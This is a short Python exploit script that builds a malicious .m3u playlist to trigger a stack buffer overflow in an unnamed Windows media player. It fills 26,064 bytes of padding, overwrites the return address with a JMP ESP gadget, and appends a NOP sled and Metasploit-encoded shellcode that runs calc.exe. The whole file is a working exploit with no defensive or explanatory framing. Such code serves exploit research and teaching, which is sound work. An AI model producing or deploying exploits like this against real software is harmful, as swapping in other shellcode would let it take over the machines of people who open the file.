import struct
OFFSET = 26064
garbage = "A" * OFFSET

jmp_esp = 0x7CB48EED
EIP = struct.pack("<I", jmp_esp)
nop_sled = "\x90" * 100

# windows/exec - 220 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependMigrate=false, EXITFUNC=seh,
# CMD=calc.exe
buf =  ""
buf += "\xbb\x27\x85\xdf\x16\xda\xdf\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x31\x83\xe8\xfc\x31\x58\x0f\x03\x58\x28\x67"
buf += "\x2a\xea\xde\xe5\xd5\x13\x1e\x8a\x5c\xf6\x2f\x8a\x3b"
buf += "\x72\x1f\x3a\x4f\xd6\x93\xb1\x1d\xc3\x20\xb7\x89\xe4"
buf += "\x81\x72\xec\xcb\x12\x2e\xcc\x4a\x90\x2d\x01\xad\xa9"
buf += "\xfd\x54\xac\xee\xe0\x95\xfc\xa7\x6f\x0b\x11\xcc\x3a"
buf += "\x90\x9a\x9e\xab\x90\x7f\x56\xcd\xb1\xd1\xed\x94\x11"
buf += "\xd3\x22\xad\x1b\xcb\x27\x88\xd2\x60\x93\x66\xe5\xa0"
buf += "\xea\x87\x4a\x8d\xc3\x75\x92\xc9\xe3\x65\xe1\x23\x10"
buf += "\x1b\xf2\xf7\x6b\xc7\x77\xec\xcb\x8c\x20\xc8\xea\x41"
buf += "\xb6\x9b\xe0\x2e\xbc\xc4\xe4\xb1\x11\x7f\x10\x39\x94"
buf += "\x50\x91\x79\xb3\x74\xfa\xda\xda\x2d\xa6\x8d\xe3\x2e"
buf += "\x09\x71\x46\x24\xa7\x66\xfb\x67\xad\x79\x89\x1d\x83"
buf += "\x7a\x91\x1d\xb3\x12\xa0\x96\x5c\x64\x3d\x7d\x19\x94"
buf += "\xcc\x4c\xb7\x01\x77\x25\xfa\x4f\x88\x93\x38\x76\x0b"
buf += "\x16\xc0\x8d\x13\x53\xc5\xca\x93\x8f\xb7\x43\x76\xb0"
buf += "\x64\x63\x53\xd3\xeb\xf7\x3f\x3a\x8e\x7f\xa5\x42"

shellcode = buf
payload = garbage + EIP + nop_sled + shellcode

with open("crash.m3u", "wb") as f:
    f.write(payload)
    f.close()
